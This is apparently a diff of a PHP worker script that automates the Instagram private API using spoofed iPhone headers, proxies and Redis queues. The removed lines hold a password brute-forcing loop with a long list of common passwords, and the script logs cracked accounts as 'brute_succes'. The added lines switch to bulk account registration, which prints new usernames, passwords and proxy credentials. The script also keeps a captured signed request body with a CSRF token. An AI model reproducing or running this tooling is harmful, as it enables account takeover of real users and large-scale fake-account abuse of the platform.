@@ -34,17 +34,17 @@ public function run() {
     
       $this->redis = $this->worker->getConnection();
       $this->debug = true;
-      $IGDataPath = null;
+     
       $this->UA = 'Instagram 9.6.0 (iPhone8,1; iPhone OS 9_3_1; en_US; en-US; scale=2.00; 750x1334) AppleWebKit/420+';
       
-      // $this->uuid = $this->generateUUID(true);
-      // $this->waterfall_id =  $this->generateUUID(true);
+      $this->uuid = $this->generateUUID(true);
+      $this->waterfall_id =  $this->generateUUID(true);
 
-      // ////
-      // $this->advertiser_id = $this->generateUUID(true);
-      // $this->anon_id = $this->generateUUID(true);
-      // $this->session_id = $this->generateUUID(true);
       ////
+      $this->advertiser_id = $this->generateUUID(true);
+      $this->anon_id = $this->generateUUID(true);
+      $this->session_id = $this->generateUUID(true);
+      //
 
       // this data from redis
       // $proxy_string = $this->redis->spop('proxy');
@@ -56,47 +56,50 @@ public function run() {
       // echo  $exploded_proxy[2].":".$exploded_proxy[3];  
 
 
-      // credentials for brute
-      // $pass_list = ["123456", "password", "12345678", "1234", "pussy", "12345", "dragon", "qwerty", "696969", "mustang", "letmein", "baseball", "master", "michael", "football", "shadow", "monkey", "abc123", "pass", "fuckme", "6969", "jordan", "harley", "ranger", "iwantu", "jennifer", "hunter", "fuck", "2000", "test", "batman", "trustno1", "thomas", "tigger", "robert", "access", "love", "buster", "1234567", "soccer", "hockey", "killer", "george", "sexy", "andrew", "charlie", "superman", "asshole", "fuckyou", "dallas", "jessica", "panties", "pepper", "1111", "austin", "william", "daniel", "golfer", "summer", "heather", "hammer", "yankees", "joshua", "maggie", "biteme", "enter", "ashley", "thunder", "cowboy", "silver", "richard", "fucker", "orange", "merlin", "michelle", "corvette", "bigdog", "cheese", "matthew", "121212", "patrick", "martin", "freedom", "ginger", "blowjob", "nicole", "sparky", "yellow", "camaro", "secret", "dick", "falcon", "taylor", "111111", "131313", "123123", "bitch", "hello", "scooter", "please", "porsche", "guitar", "chelsea", "black", "diamond", "nascar", "jackson", "cameron", "654321", "computer", "amanda", "wizard", "xxxxxxxx", "money", "phoenix", "mickey", "bailey", "knight", "iceman", "tigers", "purple", "andrea", "horny", "dakota", "aaaaaa", "player", "sunshine", "morgan", "starwars", "boomer", "cowboys", "edward", "charles", "girls", "booboo", "coffee", "xxxxxx", "bulldog", "ncc1701", "rabbit", "peanut", "john", "johnny", "gandalf", "spanky", "winter", "brandy", "compaq", "carlos", "tennis", "james", "mike", "brandon", "fender", "anthony", "blowme", "ferrari", "cookie", "chicken", "maverick", "chicago", "joseph", "diablo", "sexsex", "hardcore", "666666", "willie", "welcome", "chris", "panther", "yamaha", "justin", "banana", "driver", "marine", "angels", "fishing", "david", "maddog", "hooters", "wilson", "butthead", "dennis", "fucking", "captain", "bigdick", "chester", "smokey", "xavier", "steven", "viking", "snoopy", "blue", "eagles", "winner", "samantha", "house", "miller", "flower", "jack", "firebird", "butter", "united", "turtle", "steelers", "tiffany", "zxcvbn", "tomcat", "golf", "bond007", "bear", "tiger", "doctor", "gateway", "gators", "angel", "junior", "thx1138", "porno", "badboy", "debbie", "spider", "melissa", "booger", "1212", "flyers", "fish", "porn", "matrix", "teens", "scooby", "jason", "walter", "cumshot", "boston", "braves", "yankee", "lover", "barney", "victor", "tucker", "princess", "mercedes", "5150", "doggie", "zzzzzz", "gunner", "horney", "bubba", "2112", "fred", "johnson", "xxxxx", "tits", "member", "boobs", "donald", "bigdaddy", "bronco", "penis", "voyager", "rangers", "birdie", "trouble", "white", "topgun", "bigtits", "bitches", "green", "super", "qazwsx", "magic", "lakers", "rachel", "slayer", "scott", "2222", "asdf", "video", "london", "7777", "marlboro", "srinivas", "internet", "action", "carter", "jasper", "monster", "teresa", "jeremy", "11111111", "bill", "crystal", "peter", "pussies", "cock", "beer", "rocket", "theman", "oliver", "prince", "beach", "amateur", "7777777", "muffin", "redsox", "star", "testing", "shannon", "murphy", "frank", "hannah", "dave", "eagle1", "11111", "mother", "nathan", "raiders", "steve", "forever", "angela", "viper", "ou812", "jake", "lovers", "suckit", "gregory", "buddy", "whatever", "young", "nicholas", "lucky", "helpme", "jackie", "monica", "midnight", "college", "baby", "cunt", "brian", "mark", "startrek", "sierra", "leather", "232323", "4444", "beavis", "bigcock", "happy", "sophie", "ladies", "naughty", "giants", "booty", "blonde", "fucked", "golden", "0", "fire", "sandra", "pookie", "packers", "einstein", "dolphins", "0", "chevy", "winston", "warrior", "sammy", "slut", "8675309", "zxcvbnm", "nipples", "power", "victoria", "asdfgh", "vagina", "toyota", "travis", "hotdog", "paris", "rock", "xxxx", "extreme", "redskins", "erotic", "dirty", "ford", "freddy", "arsenal", "access14", "wolf", "nipple", "iloveyou", "alex", "florida", "eric", "legend", "movie", "success", "rosebud", "jaguar", "great", "cool", "cooper", "1313", "scorpio", "mountain", "madison", "987654", "brazil", "lauren", "japan", "naked", "squirt", "stars", "apple", "alexis", "aaaa", "bonnie", "peaches", "jasmine", "kevin", "matt", "qwertyui", "danielle", "beaver", "4321", "4128", "runner", "swimming", "dolphin", "gordon", "casper", "stupid", "shit", "saturn", "gemini", "apples", "august", "3333", "canada", "blazer", "cumming", "hunting", "kitty", "rainbow", "112233", "arthur", "cream", "calvin", "shaved", "surfer", "samson", "kelly", "paul", "mine", "king", "racing", "5555", "eagle", "hentai", "newyork", "little", "redwings", "smith", "sticky", "cocacola", "animal", "broncos", "private", "skippy", "marvin", "blondes", "enjoy", "girl", "apollo", "parker", "qwert", "time", "sydney", "women", "voodoo", "magnum", "juice", "abgrtyu", "777777", "dreams", "maxwell", "music", "rush2112", "russia", "scorpion", "rebecca", "tester", "mistress", "phantom", "billy", "6666", "albert", "qweqwe123", "qweqwe", "qwe123", "123qwe"];
-
       // foreach ($pass_list as $pass) {
       //   $this->redis->lpush("passwords", $pass);
       // }
 
 
-     $passwords = $this->redis->lrange("passwords", 0 , -1); //"qweqwe";
+ 
     
+    $this->cookies_enabled = true;
+   
+
     // while ($this->redis->scard("usernames_retry") > 0 || $this->redis->scard("usernames_clean") > 0 ) {
 
-      if ($this->redis->scard("usernames_retry") == 0 ) {
-        $this->username = $this->redis->spop("usernames_clean"); 
+      // if ($this->redis->scard("usernames_retry") == 0 ) {
+      //   $this->username = $this->redis->spop("usernames_clean"); 
        
 
-        // foreach ($passwords as $pwd) {
-        //   $this->redis->sadd( $this->username , $pwd);
-        // } 
-        $this->password =  $passwords[mt_rand(0, count($passwords) - 1)];
+      //   // foreach ($passwords as $pwd) {
+      //   //   $this->redis->sadd( $this->username , $pwd);
+      //   // } 
+      //   $this->password =  $passwords[mt_rand(0, count($passwords) - 1)];
  
-      } else {
-        $this->username = $this->redis->spop("usernames_retry");  
-        $this->password =  $passwords[mt_rand(0, count($passwords) - 1)];
-      }
+      // } else {
+      //   $this->username = $this->redis->spop("usernames_retry");  
+      //   $this->password =  $passwords[mt_rand(0, count($passwords) - 1)];
+      // }
     
-      $this->cookies_enabled = false;
-      $this->login();
+     
+      // $this->login();
     // }
 
-      // // $this->on_create_new();
-      // $this->username = "4ewir";
-      // $this->password  = "qweqwe";
-      // $this->login();
-          
+    
+    $this->on_create_new();
+
+    // $this->username  = 'ratm922';
+    // $this->password = 'qweqwe';
+    // $this->login();
+
 
  }
 
 
 public function on_create_new() {
 
+       $IGDataPath = null;
 
       $line_inst = $this->redis->spop('line_inst');
       $this->password = explode("|", $line_inst)[0];  
@@ -106,7 +109,6 @@ public function on_create_new() {
       // $bioparse = explode("|", $line_inst)[2];  
       // $captionparse = explode("|", $line_inst)[3]; 
       // $this->phone = ""; 
-
 
       if (!is_null($IGDataPath)) {
           $this->IGDataPath = $IGDataPath;
@@ -133,7 +135,7 @@ public function on_create_new() {
       $findme = 'HTTP/1.1 200 OK';
       $pos = strpos($result[0], $findme);
       if ( (isset($result[1]['errors']) &&  isset($result[1]['errors']['email'][0]) && strpos($result[1]['errors']['email'][0], 'Another account is using') !== false) || $result[1]['status'] == 'fail' ) {
-        echo 'Another account is using email: $email';
+        echo "Another account is using email: ". $email;
         $this->redis->sadd("blacklist_email",  $this->email);
          $DelFilePath =  $this->IGDataPath.'cookies.dat';
         if (file_exists($DelFilePath)) { 
@@ -150,58 +152,60 @@ public function on_create_new() {
           echo "\nconnection_established\n";
 
           $this->redis->sadd("reg_i", $this->username."|".$this->password."|".$this->proxy.":".$this->proxy_auth_credentials);
+
+          echo $this->username."|".$this->password."|".$this->proxy.":".$this->proxy_auth_credentials."\r\n";
       }
 
       $this->sync();
-      $this->ayml();
+//       $this->ayml();
 
-      $this->autocomplete_user_list();
-      $this->direct_inbox();
-      $this->ranked_recipients();
-      $this->timeline();
+//       $this->autocomplete_user_list();
+//       $this->direct_inbox();
+//       $this->ranked_recipients();
+//       $this->timeline();
 
 
-      $this->inbox();
-      $this->reels_tray();
-      $this->discover_explore();
-      $this->channels_home();
+//       $this->inbox();
+//       $this->reels_tray();
+//       $this->discover_explore();
+//       $this->channels_home();
 
-      // $user_ids = ['12335461' ,'49742317']; 
-      // $removed_ids = $user_ids;
-      // $user_ids_new = ['230581164'];
-      // $res = $this->upload_photo('/Users/alex/Desktop/other/4.jpg', '', $user_ids); // return media id
-      // $media_id = $res['media']['pk'];
-      // $this->edit_photo_tag($media_id, $removed_ids, $user_ids_new);
+//       // $user_ids = ['12335461' ,'49742317']; 
+//       // $removed_ids = $user_ids;
+//       // $user_ids_new = ['230581164'];
+//       // $res = $this->upload_photo('/Users/alex/Desktop/other/4.jpg', '', $user_ids); // return media id
+//       // $media_id = $res['media']['pk'];
+//       // $this->edit_photo_tag($media_id, $removed_ids, $user_ids_new);
 
-      $this->current_user_edit();
-      $site = ""; //"analiesecoleman.tumblr.com"; //$this->redis->spop('links_t');
-      $this->edit_profile($site);
+//       $this->current_user_edit();
+//       $site = ""; //"analiesecoleman.tumblr.com"; //$this->redis->spop('links_t');
+//       $this->edit_profile($site);
 
 
  
 
-// signed_body=8e7f921bfac46c4b9a93d4ff81ed4b998bcc5f55b5033057168cbf6f20a3c1da.{"caption":"Txt","client_timestamp":"1479434074","_csrftoken":"69TaTIL4lXzNLNVOjZhjHopy7fAYzbDk","edits":{"crop_zoom":1.384415728697743,"crop_center":[-0.2596154617773876,-0.209955523238066],"crop_original_size":[1562,1562],"filter_strength":1},"_uuid":"F30F7D45-024B-478A-A1FC-75EC32B2F629","_uid":"1009845355","scene_type":1,"camera_position":"back","source_type":0,"disable_comments":false,"waterfall_id":"7187904022d64b31bc23b2a9aa5f9e2e","scene_capture_type":"standard","software":"Instagram","geotag_enabled":false,"upload_id":1479434030,"usertags":
+// // signed_body=8e7f921bfac46c4b9a93d4ff81ed4b998bcc5f55b5033057168cbf6f20a3c1da.{"caption":"Txt","client_timestamp":"1479434074","_csrftoken":"69TaTIL4lXzNLNVOjZhjHopy7fAYzbDk","edits":{"crop_zoom":1.384415728697743,"crop_center":[-0.2596154617773876,-0.209955523238066],"crop_original_size":[1562,1562],"filter_strength":1},"_uuid":"F30F7D45-024B-478A-A1FC-75EC32B2F629","_uid":"1009845355","scene_type":1,"camera_position":"back","source_type":0,"disable_comments":false,"waterfall_id":"7187904022d64b31bc23b2a9aa5f9e2e","scene_capture_type":"standard","software":"Instagram","geotag_enabled":false,"upload_id":1479434030,"usertags":
 
    
 
 
-      // {"in":[{"user_id":"3972234248","position":[0.2439024,0.1960784]},{"user_id":"263124152","position":[0.4878049,0.1960784]}]}
+//       // {"in":[{"user_id":"3972234248","position":[0.2439024,0.1960784]},{"user_id":"263124152","position":[0.4878049,0.1960784]}]}
 
 
-      // $fs = $this->followers('2058338792');
-      // for($iter = 0; $iter < count($fs[1]['users']); $iter++) { 
-      //   $this->redis->sadd('detect', $fs[1]['users'][$iter]['pk'] );
-      // } 
-      // $fs_next = $this->followers('2058338792', $fs[1]['next_max_id']);
-      // for($iter = 0; $iter < count($fs_next[1]['users']); $iter++) { 
-      //   $this->redis->sadd('detect', $fs_next[1]['users'][$iter]['pk'] );
-      // } 
-      // $fs_next = $this->followers('2058338792', $fs_next[1]['next_max_id']);
-      // for($iter = 0; $iter < count($fs_next[1]['users']); $iter++) { 
-      //   $this->redis->sadd('detect', $fs_next[1]['users'][$iter]['pk'] );
-      // } 
+//       // $fs = $this->followers('2058338792');
+//       // for($iter = 0; $iter < count($fs[1]['users']); $iter++) { 
+//       //   $this->redis->sadd('detect', $fs[1]['users'][$iter]['pk'] );
+//       // } 
+//       // $fs_next = $this->followers('2058338792', $fs[1]['next_max_id']);
+//       // for($iter = 0; $iter < count($fs_next[1]['users']); $iter++) { 
+//       //   $this->redis->sadd('detect', $fs_next[1]['users'][$iter]['pk'] );
+//       // } 
+//       // $fs_next = $this->followers('2058338792', $fs_next[1]['next_max_id']);
+//       // for($iter = 0; $iter < count($fs_next[1]['users']); $iter++) { 
+//       //   $this->redis->sadd('detect', $fs_next[1]['users'][$iter]['pk'] );
+//       // } 
 
-       $this->funcrecur();
+//        $this->funcrecur();
 }
 
 
@@ -259,7 +263,7 @@ public function login() {
           } else {
              $this->redis->sadd("usernames_black", $this->username);
           }
-          echo "[scanner] fail to login\n";
+          echo "[-] fail to login\n";
           //return;
       } elseif ( $login[1]['status'] == 'fail' && isset($login[1]['error_type']) &&  $login[1]['error_type'] == "rate_limit_error" ) {
            $this->redis->sadd("usernames_holdon", $this->username);
@@ -267,7 +271,7 @@ public function login() {
       elseif  ( $login[1]['status'] != 'fail' ) {
           $this->redis->sadd("brute_succes", $this->username."|".$this->password);
           // $this->redis->del($this->username);
-          echo "[scanner] success";
+          echo "[+] success";
       }
 
        // $this->funcrecur();
@@ -832,7 +836,7 @@ public function  edit_profile($website)
 
 
      $data =  json_encode([
-       "phone_id"=> "",
+       "phone_id"=> $this->uuid,
        "screen"=> "landing"
      ]);
 
@@ -841,7 +845,6 @@ public function  edit_profile($website)
       preg_match('#Set-Cookie: csrftoken=([^;]+)#', $outputs[0], $matcht);
       $this->token = $matcht[1];
       // echo var_export($outputs);  
-
 
         return $outputs;
     }
